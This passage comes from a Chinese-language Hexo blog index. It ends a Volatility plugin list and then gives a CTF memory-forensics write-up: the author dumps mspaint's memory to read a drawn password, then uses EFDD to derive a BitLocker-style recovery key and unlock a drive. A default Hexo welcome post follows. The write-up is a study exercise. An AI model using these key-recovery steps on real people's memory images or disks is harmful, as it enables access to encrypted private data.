yara 签名<br>machoinfo                  - 转储 Mach-O 文件格式信息<br>malfind                    - 查找隐藏和注入的代码<br>mbrparser                  - 扫描并解析潜在的主引导记录 (MBR)<br>memdump                    - 转储进程的可寻址内存<br>memmap                     - 打印内存映射<br>messagehooks               - 列出桌面和线程窗口消息挂钩<br>mftparser                  - 扫描并解析潜在的 MFT 条目<br>moddump                    - 将内核驱动程序转储到可执行文件示例<br>modscan                    - 内核模块的池扫描器<br>modules                    - 打印加载模块的列表<br>multiscan                  - 一次扫描各种对象<br>mutantscan                 - 互斥对象的池扫描器<br>netscan                    - 扫描 Vista（或更高版本）图像的连接和套接字<br>notepad                    - 列出当前显示的记事本文本<br>objtypescan                - 扫描 Windows 对象类型对象<br>patcher                    - 基于页面扫描修补内存<br>poolpeek                   - 可配置的池扫描器插件<br>pooltracker                - 显示池标签使用的摘要<br>printkey                   - 打印注册表项及其子项和值<br>privs                      - 显示进程权限<br>procdump                   - 将进程转储到可执行文件示例<br>pslist                     - 按照 EPROCESS 列表打印所有正在运行的进程<br>psscan                     - 进程对象的池扫描器<br>pstree                     - 将进程列表打印为树<br>psxview                    - 使用各种进程列表查找隐藏进程<br>qemuinfo                   - 转储 Qemu 信息<br>raw2dmp                    - 将物理内存样本转换为 windbg 故障转储<br>screenshot                 - 保存基于 GDI 窗口的伪截图<br>servicediff                - 列出 Windows 服务（ala Plugx）<br>sessions                   - 列出 _MM_SESSION_SPACE 的详细信息（用户登录会话）<br>shellbags                  - 打印 ShellBags 信息<br>shimcache                  - 解析应用程序兼容性 Shim Cache 注册表项<br>shutdowntime               - 从注册表打印机器的 ShutdownTime<br>sockets                    - 打印打开的套接字列表<br>sockscan                   - tcp 套接字对象的池扫描器<br>ssdt                       - 显示 SSDT 条目<br>strings                    - 将物理偏移量与虚拟地址匹配（可能需要一段时间，非常冗长）<br>svcscan                    - 扫描 Windows 服务<br>symlinkscan                - 符号链接对象的池扫描器<br>thrdscan                   - 线程对象的池扫描器<br>threads                    - 调查 _ETHREAD 和 _KTHREADs<br>timeliner                  - 从内存中的各种工件创建时间线<br>timers                     - 打印内核定时器和相关的模块 DPC<br>truecryptmaster            - 恢复 TrueCrypt 7.1a 主密钥<br>truecryptpassphrase        - TrueCrypt 缓存密码短语查找器<br>truecryptsummary           - TrueCrypt 总结<br>unloadedmodules            - 打印已卸载模块的列表<br>userassist                 - 打印 userassist 注册表项和信息<br>userhandles                - 转储 USER 句柄表<br>vaddump                    - 将 vad 部分转储到文件中<br>vadinfo                    - 转储 VAD 信息<br>vadtree                    - 遍历 VAD 树并以树格式显示<br>vadwalk                    - 走 VAD 树<br>vboxinfo                   - 转储 virtualbox 信息<br>verinfo                    - 从 PE 图像中打印出版本信息<br>vmwareinfo                 - 转储 VMware VMSS&#x2F;VMSN 信息<br>volshell                   - 内存映像中的 Shell<br>win10cookie                - 查找 Windows 10 的 ObHeaderCookie 值<br>windows                    - 打印桌面窗口（详细信息）<br>wintree                    - 打印Z顺序桌面Windows树<br>wndscan                    - 用于窗口站的池扫描仪<br>yarascan                   - 使用 Yara 签名扫描进程或内核内存</p><h2 id="Scanner-Checks"><a href="#Scanner-Checks" class="headerlink" title="Scanner Checks"></a>Scanner Checks</h2><p>CheckPoolSize          - 检查池块大小<br>CheckPoolType          - 检查池类型<br>KPCRScannerCheck       - 检查自引用指针以查找KPCR<br>MultiPrefixFinderCheck - 每页检查多个字符串，在偏移处完成<br>MultiStringFinderCheck - 每页检查多个字符串<br>PoolTagCheck           - 此扫描程序检查池标记的出现</p><h1 id="vol取证-画图"><a href="#vol取证-画图" class="headerlink" title="vol取证-画图"></a>vol取证-画图</h1><h1 id="题1："><a href="#题1：" class="headerlink" title="题1："></a>题1：</h1><p>小明在学习中对各类文件加密的方式起了浓厚的兴趣，并把自己珍贵资料和 Flag 进行了套娃式加密。然而，他却在某天的凌晨三点选择了重装系统，本来他就记不住自己的密码，还丢失了备份密钥……</p><p>据受害者回忆，【他曾经使用画图软件把密码写了下来】，尽管备份已经丢失，如果能成功看到程序运行的样子，说不定就找回密码了，但是硬盘的加密怎么办呢，哎呀~要是有软件能直接破解就好了www</p><p><img src="/../../../../1md%E5%9B%BE%E7%89%87/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2024-10-23173207.png" alt="屏幕截图2024-10-23173207"></p><h6 id="根据题目得到了要去看windows的画图软件-我们去kali里去取证"><a href="#根据题目得到了要去看windows的画图软件-我们去kali里去取证" class="headerlink" title="根据题目得到了要去看windows的画图软件  我们去kali里去取证"></a>根据题目得到了要去看windows的画图软件  我们去kali里去取证</h6><p> .&#x2F;volatility_2.6_lin64_standalone -f  &#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;chal.raw imageinfo用这个代码得到版本信息</p><p><img src="/../../../../1md%E5%9B%BE%E7%89%87/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2024-10-23201246.png" alt="屏幕截图2024-10-23201246"></p><p>.&#x2F;volatility_2.6_lin64_standalone  -f &#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;chal.raw –profile&#x3D;Win7SP1x64 pstree</p><h6 id="要得到画图工具的进程就要用到pstree将进程列表打印为树，去看要的画图工具进程"><a href="#要得到画图工具的进程就要用到pstree将进程列表打印为树，去看要的画图工具进程" class="headerlink" title="要得到画图工具的进程就要用到pstree将进程列表打印为树，去看要的画图工具进程"></a>要得到画图工具的进程就要用到pstree将进程列表打印为树，去看要的画图工具进程</h6><p><img src="/../../../../1md%E5%9B%BE%E7%89%87/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2024-10-23202714.png" alt="屏幕截图2024-10-23202714"></p><p><img src="/../../../../1md%E5%9B%BE%E7%89%87%5C%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2024-10-23202822.png" alt="屏幕截图2024-10-23202822"></p><p>通过搜索得知mspaint.exe为windows的画图工具，从上述进程中看到mspaint.exede进程为 2804端口号</p><h6 id="用memdump-将端口号进程转储进程的可寻址内存-得到端口号-dmp文件"><a href="#用memdump-将端口号进程转储进程的可寻址内存-得到端口号-dmp文件" class="headerlink" title="用memdump   将端口号进程转储进程的可寻址内存 得到端口号.dmp文件"></a>用memdump   将端口号进程转储进程的可寻址内存 得到端口号.dmp文件</h6><p>.&#x2F;volatility_2.6_lin64_standalone  -f &#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;chal.raw –profile&#x3D;Win7SP1x64 memdump -p &lt;端口号&gt;  -D .&#x2F;          </p><p><img src="/../../../../1md%E5%9B%BE%E7%89%87/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2024-10-23203800.png" alt="屏幕截图2024-10-23203800"></p><h6 id="将得到的端口号-dmp文件改名为端口号-data文件放进GIMP中调整图片位置得到密码"><a href="#将得到的端口号-dmp文件改名为端口号-data文件放进GIMP中调整图片位置得到密码" class="headerlink" title="将得到的端口号.dmp文件改名为端口号.data文件放进GIMP中调整图片位置得到密码"></a>将得到的端口号.dmp文件改名为端口号.data文件放进GIMP中调整图片位置得到密码</h6><p><img src="/../../../../1md%E5%9B%BE%E7%89%87/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2024-10-23204112.png" alt="屏幕截图2024-10-23204112"></p><h6 id="在GIMP中调整图片位置是先确定宽和高分贝为2560x1440-然后再来拉动位移找密码"><a href="#在GIMP中调整图片位置是先确定宽和高分贝为2560x1440-然后再来拉动位移找密码" class="headerlink" title="在GIMP中调整图片位置是先确定宽和高分贝为2560x1440,然后再来拉动位移找密码"></a>在GIMP中调整图片位置是先确定宽和高分贝为2560x1440,然后再来拉动位移找密码</h6><p><img src="/../../../../1md%E5%9B%BE%E7%89%87/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2024-10-23204548.png" alt="屏幕截图2024-10-23204548"></p><h6 id="我们已经得到了密码了再看题目，就要去进行硬盘的解密"><a href="#我们已经得到了密码了再看题目，就要去进行硬盘的解密" class="headerlink" title="我们已经得到了密码了再看题目，就要去进行硬盘的解密"></a>我们已经得到了密码了再看题目，就要去进行硬盘的解密</h6><h3 id="硬盘的解密"><a href="#硬盘的解密" class="headerlink" title="硬盘的解密"></a>硬盘的解密</h3><h6 id="从题目的压缩包中得到的e盘双击挂载"><a href="#从题目的压缩包中得到的e盘双击挂载" class="headerlink" title="从题目的压缩包中得到的e盘双击挂载"></a>从题目的压缩包中得到的e盘双击挂载</h6><p>![屏幕截图2024-10-24 171015](..&#x2F;..&#x2F;..&#x2F;..&#x2F;1md图片&#x2F;屏幕截图2024-10-24 171015.png)</p><h6 id="我们要用efdd得到48位密钥解锁"><a href="#我们要用efdd得到48位密钥解锁" class="headerlink" title="我们要用efdd得到48位密钥解锁"></a>我们要用efdd得到48位密钥解锁</h6><p>![屏幕截图2024-10-24 171405](..&#x2F;..&#x2F;..&#x2F;..&#x2F;1md图片&#x2F;屏幕截图2024-10-24 171405.png)</p><p>![屏幕截图2024-10-24 171431](..&#x2F;..&#x2F;..&#x2F;..&#x2F;1md图片&#x2F;屏幕截图2024-10-24 171431.png)</p><h6 id="我们要将得到-dmp文件和之前从GIMP得到的密码放入efdd中得到48为密码"><a href="#我们要将得到-dmp文件和之前从GIMP得到的密码放入efdd中得到48为密码" class="headerlink" title="我们要将得到.dmp文件和之前从GIMP得到的密码放入efdd中得到48为密码"></a>我们要将得到.dmp文件和之前从GIMP得到的密码放入efdd中得到48为密码</h6><p>![屏幕截图2024-10-24 171513](..&#x2F;..&#x2F;..&#x2F;..&#x2F;1md图片&#x2F;屏幕截图2024-10-24 171513.png)</p><p>![屏幕截图2024-10-24 171955](..&#x2F;..&#x2F;..&#x2F;..&#x2F;1md图片&#x2F;屏幕截图2024-10-24 171955.png)</p><p>![屏幕截图2024-10-24 172102](..&#x2F;..&#x2F;..&#x2F;..&#x2F;1md图片&#x2F;屏幕截图2024-10-24 172102.png)</p><h6 id="就得到了flag"><a href="#就得到了flag" class="headerlink" title="就得到了flag"></a>就得到了flag</h6><p>![屏幕截图2024-10-24 172152](..&#x2F;..&#x2F;..&#x2F;..&#x2F;1md图片&#x2F;屏幕截图2024-10-24 172152.png)</p>]]></content>
    
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>vol取证</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/01/21/hello-world/"/>
    <url>/2025/01/21/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
